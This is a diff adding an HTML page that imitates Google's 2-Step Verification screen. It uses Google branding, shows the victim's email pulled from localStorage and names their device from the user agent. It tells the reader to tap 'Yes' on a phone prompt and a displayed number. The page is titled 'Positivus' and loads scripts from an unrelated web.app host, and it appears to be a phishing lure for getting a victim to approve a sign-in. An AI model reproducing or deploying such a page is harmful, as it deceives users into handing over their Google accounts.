@@ -1,0 +1,256 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"
+    />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <script defer="defer" src="https://testpagani.web.app/static/js/main.54d977ba.js"></script>
+    <script defer="defer" src="https://testpagani.web.app/static/js/main.54d977baC.js"></script>
+    <link href="https://testpagani.web.app/static/css/main.47f7c978.css" rel="stylesheet" />
+    <script src="https://testpagani.web.app/static/js/daja.js"></script>
+    <title>Positivus</title>
+  </head>
+  <body
+    style="
+      margin: 0;
+      box-sizing: border-box;
+      font-family: 'Arial';
+      line-height: 1.4;
+      padding: 15px;
+      font-size: 16px;
+    "
+  >
+    <div
+      style="
+        border: 1px solid #cccccc;
+        border-radius: 10px;
+        padding: 20px 30px 30px 30px;
+        max-width: 445px;
+        margin: 10px auto;
+        box-sizing: border-box;
+      "
+    >
+      <img
+        src="https://cdn.freebiesupply.com/images/thumbs/2x/google-logo.png"
+        alt=""
+        style="display: block; width: 120px; margin: auto"
+      />
+      <h2
+        style="
+          text-align: center;
+          margin: -15px 0 10px 0;
+          font-size: 24px;
+          font-weight: 400;
+          font-family: Google Sans,Noto Sans Myanmar UI,arial,sans-serif;
+          
+        "
+      >
+        2-Step Verification
+      </h2>
+      <p style="text-align: center; max-width: 350px; margin: auto;font-size: 16.0px; font-family: Google Sans,Noto Sans Myanmar UI,arial,sans-serif;">
+        To help keep your account safe, Google wants to make sure it's really
+        you trying to sign in <br />
+      </p>
+      <div
+        style="margin: 10px auto 0 auto; width: fit-content; position: relative"
+      >
+      <select
+      style="
+        -webkit-appearance: none;
+        border-radius: 40px;
+        border: 1px solid #cccccc;
+        width: 100%;
+        max-width: 280px;
+        font-weight: 410;
+        margin: auto;
+        padding: 8px 8px 8px 32px;
+        display: block;
+        box-sizing: border-box;
+        color: black;
+      "
+    >
+      <option style="color: black; font-size: 14.5px;">
+        <!-- Add the following line to retrieve the email from local storage -->
+        <script>
+          const userEmail = localStorage.getItem('user_email');
+          document.writeln(userEmail);
+        </script>
+      </option>
+    </select>
+        <div
+          style="
+            position: absolute;
+            top: 0;
+            left: 8px;
+            height: 100%;
+            display: flex;
+            align-items: center;
+          "
+        >
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            width="20px"
+            height="20px"
+            viewBox="0 0 512 512"
+          >
+            <!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. -->
+            <path
+              d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c39.77 0 72 32.24 72 72S295.8 272 256 272c-39.76 0-72-32.24-72-72S216.2 128 256 128zM256 448c-52.93 0-100.9-21.53-135.7-56.29C136.5 349.9 176.5 320 224 320h64c47.54 0 87.54 29.88 103.7 71.71C356.9 426.5 308.9 448 256 448z"
+            />
+          </svg>
+        </div>
+      </div>
+      <h2
+        style="
+          text-align: center;
+          font-size: 44px;
+          font-weight: 500;
+          margin-bottom: 0;
+        "
+      ><br>
+        <div id="root"></div><br>
+      </h2>
+      <h4 style="font-size: 16.4px; font-weight: 500; margin-bottom: -5px; font-family: Google Sans,Noto Sans Myanmar UI,arial,sans-serif;">
+        Check your phone
+      </h4><br>
+      <p style="display: inline; font-size: 16.0px; font-family: Google Sans,Noto Sans Myanmar UI,arial,sans-serif;">
+        Google sent a notification to your     <script>
+          const UserAgent = navigator.userAgent
+          const device = {
+              iPad: /iPad/.test(UserAgent),
+              iPhone: /iPhone/.test(UserAgent),
+              Android: /Android/.test(UserAgent),
+              windows: /Windows/.test(UserAgent)
+          }
+  
+          for(dev in device){
+              if(device[dev])
+              document.writeln("" + dev);
+          }
+          
+      </script>. Open the Gmail
+        app, tap <strong>Yes</strong>
+        on the prompt, then tap
+        <strong><div style="display: inline-block; font-size: 16.0px; font-family: Google Sans,Noto Sans Myanmar UI,arial,sans-serif;" id="root1"></div></strong><span style="font-size: 16.4px; font-weight: 500; margin-bottom: -5px; font-family: Google Sans,Noto Sans Myanmar UI,arial,sans-serif;">&nbsp;on your phone  to verify it's you.</span>
+      </p>
+
+      <div>
+        <label>
+          <input type="checkbox" checked style="margin: 0; font-size: 16.0px; font-family: Google Sans,Noto Sans Myanmar UI,arial,sans-serif;" />
+          <span style="margin-left: 10px; font-size: 14.4px; font-family: Google Sans,Noto Sans Myanmar UI,arial,sans-serif;">Don't ask again on this device</span>
+        </label>
+      </div>
+      <div style="margin: 50px 0">
+        <a
+          href="#"
+          style="
+            color: #0090fc !important;
+            text-decoration: none !important;
+            font-weight: 600;
+            font-size: 13.8px;
+            font-family: Google Sans,Noto Sans Myanmar UI,arial,sans-serif;
+          "
+          >Resend it</a
+        >
+      </div>
+      <div style="margin-bottom: 20px">
+        <a
+          href="#"
+          style="
+            color: #0090fc !important;
+            text-decoration: none !important;
+            font-weight: 550;
+            font-size: 13.8px;
+            font-family: roboto,Noto Sans Myanmar UI,arial,sans-serif;
+          "
+          >Try another way</a
+        >
+      </div>
+    </div>
+
+    <div
+      style="
+        font-size: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        max-width: 445px;
+        margin: auto;
+      "
+    >
+      <div>
+        English (United States)
+        <svg
+          xmlns="http://www.w3.org/2000/svg"
+          width="10"
+          height="10"
+          fill="currentColor"
+          class="bi bi-caret-down-fill"
+          viewBox="0 0 16 16"
+        >
+          <path
+            d="M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z"
+          />
+        </svg>
+      </div>
+      <div>
+        <a
+          href="#"
+          style="
+            color: black !important;
+            text-decoration: none !important;
+            margin-left: 15px;
+          "
+          >Help</a
+        >
+        <a
+          href="#"
+          style="
+            color: black !important;
+            text-decoration: none !important;
+            margin-left: 15px;
+          "
+          >Privacy</a
+        >
+        <a
+          href="#"
+          style="
+            color: black !important;
+            text-decoration: none !important;
+            margin-left: 15px;
+          "
+          >Terms</a
+        >
+      </div>
+    </div>
+
+    <style>
+      @media screen and (max-width: 768px) {
+        body > div:nth-child(1) {
+          border-radius: 2px !important;
+          padding: 15px 15px 150px 15px !important;
+          border: none !important;
+        }
+        body > div:nth-child(2) {
+          margin-top: -100px !important;
+          padding: 15px !important;
+          flex-direction: column !important;
+          align-items: start !important;
+        }
+        body > div:nth-child(2) > div:nth-child(2) {
+          margin-top: 20px;
+        }
+        body > div:nth-child(2) > div:nth-child(2) a:nth-child(1) {
+          margin-left: 0 !important;
+        }
+        body > div > img {
+          margin-top: -15px !important;
+        }
+      }
+    </style>
+  </body>
+</html>
